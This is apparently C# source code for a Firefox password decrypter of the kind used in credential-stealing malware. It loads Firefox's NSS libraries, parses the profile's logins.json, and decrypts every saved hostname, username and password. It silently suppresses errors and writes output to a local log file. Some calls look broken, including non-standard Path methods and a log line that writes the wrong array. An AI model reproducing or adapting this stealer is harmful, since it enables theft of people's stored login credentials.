using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

class FFDecrypter
{
    public struct TSECItem
    {
        public int SECItemType;

        public int SECItemData;

        public int SECItemLen;
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate(string path);

    public delegate int DLLFunctionDelegate2(IntPtr arenaOpt, IntPtr outItemOpt, string inStr, int inLen);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate3();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate4(long slot, bool loadCerts, long wincx);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate6();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate7(long slot);

    private static string FFexe = Path.GetFireFoxExePath();
    private static string FFProfile = Path.GetFireFoxPath();
    private static List<string[]> data = new List<string[]>();
    private static IntPtr NSS3;


    public static long NSS_Init(string path)
    {
        LoadLibrary(FFexe + "mozglue.dll");
        NSS3 = LoadLibrary(FFexe + "nss3.dll");
        IntPtr procAddress = GetProcAddress(NSS3, "NSS_Init");
        DLLFunctionDelegate dLLFunctionDelegate = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate));
        return dLLFunctionDelegate(path);
    }

    public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, string inStr, int inLen)
    {
        IntPtr procAddress = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
        DLLFunctionDelegate2 dLLFunctionDelegate = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate2));
        return dLLFunctionDelegate(arenaOpt, outItemOpt, inStr, inLen);
    }

    public static long PK11_GetInternalKeySlot()
    {
        IntPtr procAddress = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
        DLLFunctionDelegate3 dLLFunctionDelegate = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate3));
        return dLLFunctionDelegate();
    }

    public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
    {
        IntPtr procAddress = GetProcAddress(NSS3, "PK11_Authenticate");
        DLLFunctionDelegate4 dLLFunctionDelegate = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate4));
        return dLLFunctionDelegate(slot, loadCerts, wincx);
    }

    public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
    {
        IntPtr procAddress = GetProcAddress(NSS3, "PK11SDR_Decrypt");
        DLLFunctionDelegate5 dLLFunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate5));
        return dLLFunctionDelegate(ref data, ref result, cx);
    }

    public static int NSS_Shutdown()
    {
        IntPtr procAddress = GetProcAddress(NSS3, "NSS_Shutdown");
        DLLFunctionDelegate6 dLLFunctionDelegate = (DLLFunctionDelegate6)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate6));
        return dLLFunctionDelegate();
    }

    public static int PK11_FreeSlot(long slot)
    {
        IntPtr procAddress = GetProcAddress(NSS3, "PK11_FreeSlot");
        DLLFunctionDelegate7 dLLFunctionDelegate = (DLLFunctionDelegate7)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate7));
        return dLLFunctionDelegate(slot);
    }

    public static void ParseJson()
    {
        string text = File.ReadAllText($"{FFProfile}\\logins.json");
        while (text.IndexOf("\"encryptedPassword\":\"") != -1)
        {
            text = text.Substring(text.IndexOf("\"hostname\":\"") + 12);
            string text2 = text;
            text2 = text2.Remove(text2.IndexOf("\",\"httpRealm\""));
            text = text.Substring(text.IndexOf("\"encryptedUsername\":\"") + 21);
            string text3 = text;
            text3 = text3.Remove(text3.IndexOf("\""));
            text = text.Substring(text.IndexOf("\"encryptedPassword\":\"") + 21);
            string text4 = text;
            text4 = text4.Remove(text4.IndexOf("\""));
            data.Add(new string[]
				{
					text2,
					text3,
					text4
				});
        }
    }
    public static void DecryptFirefox(List<string[]> general)
    {
        try
        {
            if (FFexe != null && FFProfile != null)
            {
                ParseJson();
                int count = general.Count;
                string[] array = new string[4];
                array[0] = "########################";
                array[1] = FFProfile;
                array[2] = "########################";
                general.Add(array);
                for (int i = 0; i < data.Count; i++)
                {
                    general.Add(new string[]
						{
                            $"{count + i + 1})",
							data[i][0],
							decrypt(data[i][1]),
							decrypt(data[i][2])
						});
                    File.AppendAllText("llog.txt", array[i]);
                }
            }
        }
        catch
        {
        }
    }
    private static string decrypt(string S)
    {
        TSECItem tSECItem = default(TSECItem);
        NSS_Init(FFProfile);
        long num = PK11_GetInternalKeySlot();
        if (num == 0L)
        {
            return string.Empty;
        }
        PK11_Authenticate(num, true, 0L);
        int value = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, S, S.Length);
        TSECItem tSECItem2 = (TSECItem)Marshal.PtrToStructure(new IntPtr(value), typeof(TSECItem));
        if (PK11SDR_Decrypt(ref tSECItem2, ref tSECItem, 0) != 0)
        {
            return string.Empty;
        }
        if (tSECItem.SECItemLen != 0)
        {
            byte[] array = new byte[tSECItem.SECItemLen];
            Marshal.Copy(new IntPtr(tSECItem.SECItemData), array, 0, tSECItem.SECItemLen);
            return Encoding.ASCII.GetString(array);
        }
        return string.Empty;
    }
    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string dllFilePath);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}